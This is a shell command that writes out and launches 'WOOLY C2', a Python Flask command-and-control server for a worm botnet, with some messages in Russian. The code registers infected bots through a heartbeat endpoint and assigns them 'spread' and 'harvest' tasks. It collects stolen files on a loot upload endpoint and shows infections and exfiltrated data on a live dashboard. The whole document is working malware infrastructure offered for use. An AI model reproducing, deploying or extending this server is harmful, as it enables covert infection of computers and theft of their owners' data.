cd ~/Net-Worm && rm woolyserver.py && cat > woolyserver.py << 'EOF'
#!/usr/bin/env python3
"""
🐛 WOOLY C2 v15.3 - FIXED & BULLETPROOF | Python 3.13 Native
✅ No external WS servers | Threaded | Auto-port | Thread-safe DB
"""

import json
import os
import random
import sqlite3
import threading
import time
from datetime import datetime
from pathlib import Path
from typing import Dict, Any
import socket

try:
    from flask import Flask, request, jsonify, send_file, render_template_string
    from flask_socketio import SocketIO, emit
    print("✅ Flask & SocketIO импортированы")
except ImportError as e:
    print(f"❌ Установите зависимости: pip3 install flask flask-socketio --break-system-packages")
    print(f"Ошибка: {e}")
    exit(1)

app = Flask(__name__)
app.config['SECRET_KEY'] = 'wooly-v15-super-secure-key'
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024

socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading', logger=False, engineio_logger=False)

# Global state - THREAD-SAFE
db_lock = threading.Lock()
bots_cache = {}
loot_dir = Path('loot')
loot_dir.mkdir(exist_ok=True)
db_path = 'wooly.db'

def get_db():
    """Thread-safe DB connection"""
    with db_lock:
        conn = sqlite3.connect(db_path, check_same_thread=False)
        conn.execute('''CREATE TABLE IF NOT EXISTS bots 
            (id TEXT PRIMARY KEY, status TEXT, last_seen INTEGER, infections INTEGER)''')
        conn.execute('''CREATE TABLE IF NOT EXISTS loot 
            (id INTEGER PRIMARY KEY AUTOINCREMENT, bot_id TEXT, type TEXT, filename TEXT, size INTEGER, timestamp INTEGER)''')
        conn.commit()
        return conn

# ════════════════════════════════════════════════════════════════════════════════
# 📡 BOT API ENDPOINTS
@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    try:
        data = request.json or {}
        bot_id = data.get('id', str(request.remote_addr))
        now = int(time.time())
        
        conn = get_db()
        conn.execute("INSERT OR REPLACE INTO bots VALUES (?, 'online', ?, COALESCE(?, 0))",
                    (bot_id, now, data.get('infections')))
        conn.commit()
        bots_cache[bot_id] = {'status': 'online', 'last_seen': now, 'infections': data.get('infections', 0)}
        conn.close()
        
        # Broadcast to dashboard
        socketio.emit('bot_update', {'id': bot_id, 'status': 'online', 'infections': data.get('infections', 0)})
        
        return jsonify({'task': random.choice(['recon', 'spread', 'harvest']), 'status': 'ok'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/loot/<bot_id>/<path:type_>', methods=['POST'])
def loot(bot_id, type_):
    try:
        if 'file' in request.files:
            file = request.files['file']
            if file.filename:
                filename = f"{bot_id}_{type_}_{int(time.time())}.{file.filename.rsplit('.',1)[-1] if '.' in file.filename else 'bin'}"
                path = loot_dir / filename
                file.save(path)
                
                conn = get_db()
                conn.execute("INSERT INTO loot (bot_id, type, filename, size, timestamp) VALUES (?, ?, ?, ?, ?)",
                            (bot_id, type_, filename, path.stat().st_size, int(time.time())))
                conn.commit()
                conn.close()
                
                socketio.emit('loot', {'bot_id': bot_id, 'type': type_, 'file': filename, 'size': path.stat().st_size})
                return 'OK'
        return 'NO_FILE'
    except Exception as e:
        return f'ERROR: {str(e)}'

@app.route('/loot/<filename>')
def get_loot(filename):
    path = loot_dir / filename
    if path.exists():
        return send_file(path, as_attachment=True)
    return 'File not found', 404

@app.route('/bots')
def api_bots():
    conn = get_db()
    bots = conn.execute("SELECT * FROM bots WHERE last_seen > ?", 
                       (int(time.time())-300,)).fetchall()
    conn.close()
    return jsonify([dict(zip(['id','status','last_seen','infections'], bot)) for bot in bots])

# ════════════════════════════════════════════════════════════════════════════════
# 🖥️ DASHBOARD
@app.route('/')
@app.route('/dashboard')
def dashboard():
    conn = get_db()
    bots = conn.execute("SELECT id, status, last_seen, infections FROM bots WHERE last_seen > ? ORDER BY last_seen DESC",
                       (int(time.time())-300,)).fetchall()
    loot = conn.execute("SELECT bot_id, type, filename, size FROM loot ORDER BY timestamp DESC LIMIT 10").fetchall()
    conn.close()
    
    uptime = time.strftime('%H:%M:%S', time.gmtime(time.time()))
    
    html_template = '''
<!DOCTYPE html>
<html>
<head>
    <title>🐛 WOOLY C2 v15.3 | LIVE DASHBOARD</title>
    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
    <meta name="viewport" content="width=device-width">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:linear-gradient(135deg,#000,#111);color:#0f0;font-family:'Courier New',monospace;padding:20px;font-size:14px}
        .header{padding:20px;text-align:center;border-bottom:2px solid #0f0}
        .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:20px;margin:20px 0}
        .card{background:rgba(0,0,0,0.8);padding:20px;border:1px solid #333;border-left:4px solid #0f0}
        .bots-grid{display:grid;gap:10px;max-height:400px;overflow:auto}
        .bot{display:flex;justify-content:space-between;align-items:center;background:#111;padding:15px;border-left:3px solid #0a0;border-radius:4px}
        .bot-id{font-weight:bold;flex:1}
        .bot-stats{font-size:12px;color:#aaa}
        .bot-controls button{background:#0066cc;color:white;border:none;padding:8px 12px;margin:0 2px;border-radius:3px;cursor:pointer;font-family:monospace}
        .bot-controls button:hover{background:#0088ff}
        .loot{background:#220;padding:15px;margin:20px 0;border-left:4px solid #ff6600;border-radius:4px}
        #log{background:#000;height:200px;overflow:auto;padding:10px;font-size:12px;border:1px solid #333}
        .log-entry{padding:2px}
        .refresh-btn{background:#0f0;color:#000;border:none;padding:10px 20px;border-radius:4px;cursor:pointer;font-family:monospace;margin:10px}
    </style>
</head>
<body>
    <div class="header">
        <h1>🐛 WOOLY C2 v15.3</h1>
        <div id="live-stats">Loading...</div>
    </div>

    <div class="stats">
        <div class="card">
            <h3>🦠 Active Bots</h3>
            <div id="bot-count">{{ bots|length }}</div>
        </div>
        <div class="card">
            <h3>💾 Recent Loot</h3>
            <div id="loot-count">{{ loot|length }}</div>
        </div>
        <div class="card">
            <h3>⏰ Uptime</h3>
            <div>{{ uptime }}</div>
        </div>
    </div>

    <div class="bots-grid" id="bots-container">
    {% for bot in bots %}
        <div class="bot">
            <div>
                <div class="bot-id">{{ bot[0] }}</div>
                <div class="bot-stats">{{ bot[3] }} infections | {{ "%.0f"|format(((now - bot[2])/60)) }}min ago</div>
            </div>
            <div class="bot-controls">
                <button onclick="sendTask('{{ bot[0] }}','spread')">SPREAD</button>
                <button onclick="sendTask('{{ bot[0] }}','harvest')">HARVEST</button>
                <button onclick="sendTask('{{ bot[0] }}','exfil')">EXFIL</button>
            </div>
        </div>
    {% endfor %}
    </div>

    <div class="loot card">
        <h3>📦 Recent Files</h3>
        {% for l in loot %}
        <div>{{ l[0] }}: {{ l[2] }} ({{ "%.1f"|format(l[3]/1024) }}KB) 
            <a href="/loot/{{ l[2] }}" download style="color:#ff6600">[DOWNLOAD]</a>
        </div>
        {% endfor %}
    </div>

    <div class="card">
        <button class="refresh-btn" onclick="location.reload()">🔄 REFRESH</button>
        <div id="log">[SYSTEM] Wooly C2 v15.3 - Thread-safe & Ready</div>
    </div>

    <script>
        const socket = io({transports: ['websocket', 'polling']});
        
        socket.on('connect', () => log('[NET] SocketIO connected'));
        socket.on('bot_update', data => { 
            log(`[+] ${data.id} online (${data.infections || 0} infections)`); 
            location.reload();
        });
        socket.on('loot', data => log(`[💾 LOOT] ${data.bot_id}: ${data.type} (${data.size/1024|0}KB)`));
        
        function log(msg) {
            const logDiv = document.getElementById('log');
            logDiv.innerHTML += `<div class="log-entry">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            logDiv.scrollTop = logDiv.scrollHeight;
        }
        
        function sendTask(botId, task) {
            fetch('/heartbeat', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({id: botId, task: task})
            }).then(r => log(`[TASK] ${botId} <- ${task}`));
        }
        
        // Live stats update
        setInterval(() => {
            fetch('/bots').then(r=>r.json()).then(bots => {
                document.getElementById('bot-count').textContent = bots.length;
                document.getElementById('live-stats').textContent = `${bots.length} bots | ${new Date().toLocaleTimeString()}`;
            });
        }, 5000);
    </script>
</body></html>
    '''
    
    now = int(time.time())
    return render_template_string(html_template, 
                                bots=bots, loot=loot, uptime=uptime, now=now)

if __name__ == '__main__':
    print("🐛 WOOLY C2 v15.3 STARTING (Threaded Mode)...")
    
    # Auto-port detection
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(('', 0))
    port = sock.getsockname()[1]
    sock.close()
    
    print(f"✅ Dashboard: http://0.0.0.0:{port}")
    print(f"✅ API: http://0.0.0.0:{port}/heartbeat")
    print(f"📡 Bot endpoint: http://{socket.gethostbyname(socket.gethostname())}:{port}/heartbeat")
    
    # Threaded server (Python 3.13 native)
    socketio.run(app, host='0.0.0.0', port=port, debug=False, allow_unsafe_werkzeug=True)
EOF

echo "✅ Код сохранен. Запуск:"
echo "python3 woolyserver.py"
